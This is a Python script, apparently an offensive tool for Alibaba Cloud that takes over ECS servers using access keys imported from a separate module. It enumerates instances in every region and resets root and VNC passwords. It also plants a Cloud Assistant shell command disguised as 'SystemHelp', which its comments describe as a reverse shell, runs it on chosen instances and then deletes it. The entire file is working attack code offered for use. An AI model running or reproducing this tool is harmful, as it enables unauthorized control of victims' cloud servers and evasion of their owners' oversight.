#coding=utf-8
import json
import optparse
from aksk import *
import base64
from aliyunsdkcore.client import AcsClient
from aliyunsdkcore.acs_exception.exceptions import ClientException
from aliyunsdkcore.acs_exception.exceptions import ServerException
from aliyunsdkecs.request.v20140526.DescribeRegionsRequest import DescribeRegionsRequest
from aliyunsdkecs.request.v20140526.DescribeInstancesRequest import DescribeInstancesRequest
from aliyunsdkecs.request.v20140526.RebootInstanceRequest import RebootInstanceRequest
from aliyunsdkecs.request.v20140526.ModifyInstanceVncPasswdRequest import ModifyInstanceVncPasswdRequest
from aliyunsdkecs.request.v20140526.ModifyInstanceAttributeRequest import ModifyInstanceAttributeRequest
from aliyunsdkecs.request.v20140526.DescribeInstanceVncUrlRequest import DescribeInstanceVncUrlRequest
from aliyunsdkecs.request.v20140526.DescribeCloudAssistantStatusRequest import DescribeCloudAssistantStatusRequest
from aliyunsdkecs.request.v20140526.DescribeCommandsRequest import DescribeCommandsRequest
from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest
from aliyunsdkecs.request.v20140526.InvokeCommandRequest import InvokeCommandRequest
from aliyunsdkecs.request.v20140526.DeleteCommandRequest import DeleteCommandRequest



def getRegionIds():
    client = AcsClient(ak, sk, 'cn-hangzhou')
    request = DescribeRegionsRequest()
    request.set_accept_format('json')
    response = json.loads(client.do_action_with_exception(request))
    regions = response['Regions']['Region']
    regionIds = []
    for i in regions:
        regionIds.append(i['RegionId'])
    return regionIds


def getInstances(region):
    id=[]
    shellStatus={}
    client = AcsClient(ak, sk, region)
    request = DescribeInstancesRequest()
    request.set_accept_format('json')
    request.set_PageSize(50)
    response = json.loads(client.do_action_with_exception(request))
    instances = response['Instances']['Instance']
    if bool(instances):
        print(region)        
        for ins in instances:
            id.append(ins['InstanceId'])
        status = cloudAssistantStatus(id,region)
        for i in status:
            shellStatus[i['InstanceId']] = i['CloudAssistantStatus']
        for ins in instances:
            print("Id: %s\tName: %s\t%s\t%s\t%s\tPublicIp: %s\tInnerIp: %s"%(ins['InstanceId'],ins['InstanceName'],ins['OSName'],ins['Status'],shellStatus[ins['InstanceId']],ins['PublicIpAddress']['IpAddress'],ins['VpcAttributes']['PrivateIpAddress']['IpAddress']))


def resetVncPasswd(instance,region):
    client = AcsClient(ak, sk, region)
    request = ModifyInstanceVncPasswdRequest()
    request.set_accept_format('json')
    request.set_InstanceId(instance)
    request.set_VncPassword(vncPassword)
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


def resetInstancePasswd(instance,region):
    client = AcsClient(ak, sk, region)
    request = ModifyInstanceAttributeRequest()
    request.set_accept_format('json')
    request.set_InstanceId(instance)
    request.set_Password(insPassword)
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


#查询服务器vncUrl
def getVncUrl(instance,region):
    client = AcsClient(ak, sk, region)
    request = DescribeInstanceVncUrlRequest()
    request.set_accept_format('json')
    request.set_InstanceId(instance)
    url = json.loads(client.do_action_with_exception(request))
    url = 'https://g.alicdn.com/aliyun/ecs-console-vnc2/0.0.5/index.html?vncUrl=%s&instanceId=%s&password=%s'%(url['VncUrl'],instance,vncPassword)
    print(url)


#重启服务器
def rebootInstance(instance,region):
    client = AcsClient(ak, sk,region)
    request = RebootInstanceRequest()
    request.set_accept_format('json')
    request.set_InstanceId(instance)
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


#查询是否安装了云助手
def cloudAssistantStatus(instances,region):
    client = AcsClient(ak, sk, region)
    request = DescribeCloudAssistantStatusRequest()
    request.set_accept_format('json')
    request.set_InstanceIds(instances)
    response = client.do_action_with_exception(request)
    status = json.loads(response)
    status = status['InstanceCloudAssistantStatusSet']['InstanceCloudAssistantStatus']
    return status


#查询云助手命令
def listCommands(region):
    client = AcsClient(ak, sk, region)
    request = DescribeCommandsRequest()
    request.set_accept_format('json')
    response = json.loads(client.do_action_with_exception(request))
    commands = response['Commands']['Command']
    for c in commands:
        print("Name:%s\tId: %s\tCommand:%s\tParams:%s"%(c['Name'],c['CommandId'],str(base64.b64decode(c['CommandContent']),encoding='utf-8'),c['ParameterNames']))


#创建云助手getshell命令
def createCommand(region):
    client = AcsClient(ak, sk, region)
    request = CreateCommandRequest()
    request.set_accept_format('json')
    request.set_Name("SystemHelp")
    request.set_Type("RunShellScript")
    request.set_CommandContent(base64.b64encode(command.encode('utf-8')))
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


#执行反弹shell命令
def excuteCommand(region,instance,commandId):
    client = AcsClient(ak, sk, region)
    request = InvokeCommandRequest()
    request.set_accept_format('json')
    request.set_CommandId(commandId)
    request.set_InstanceIds([instance])
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


#删除云助手命令
def delCommand(region,commandId):
    client = AcsClient(ak, sk, region)
    request = DeleteCommandRequest()
    request.set_accept_format('json')
    request.set_CommandId(commandId)
    response = client.do_action_with_exception(request)
    print(str(response, encoding='utf-8'))


if __name__ == "__main__":
    # print(ak,sk,base64.b64encode(command.encode('utf-8')),insPassword,vncPassword)
    usage = 'Usage: %prog [options] arg1 arg2 ...'
    parse = optparse.OptionParser(usage, version="%prog v0.1")
    parse.add_option('-a', '--action', dest='action', help='rvp:resetVncPassword->vncPassword rip:resetInstancePassword->insPassword reboot:rebootInstance gvu:getVncUrl lc:listCommands cc:createCommand ec:excuteCommand dc:delCommand cs:canExcute?')
    parse.add_option('-r', '--regionid', dest='regionid', default='all', help="设置aliyun的regionId(all,cn-hangzhou,cn-xxx) default:all")
    parse.add_option('-i', '--instance', dest='instance', help="设置要操作的ecs的id")
    parse.add_option('-c', '--commandId', dest='commandId', help="设置要操作的云助手的命令id")
    options, args = parse.parse_args()

    region = options.regionid
    instance = options.instance
    action = options.action
    commandId = options.commandId

    if region != 'all':
        if bool(instance):
            if action == 'rvp':
                resetVncPasswd(instance,region)
            elif action == 'rip':
                resetInstancePasswd(instance,region)
            elif action == 'gvu':
                getVncUrl(instance,region)
            elif action == 'reboot':
                rebootInstance(instance,region)
            if action == 'cs':
                cloudAssistantStatus(instance,region)
            elif bool(commandId) and action == 'ec':
                excuteCommand(region,instance,commandId)
        elif bool(commandId):
            if action == 'dc':
                delCommand(region,commandId)
        else:
            getInstances(region)
            if action == 'lc':
                listCommands(region)
            if action == 'cc':
                createCommand(region)
    else:
        regionIds = getRegionIds()
        for r in regionIds:
            getInstances(r)
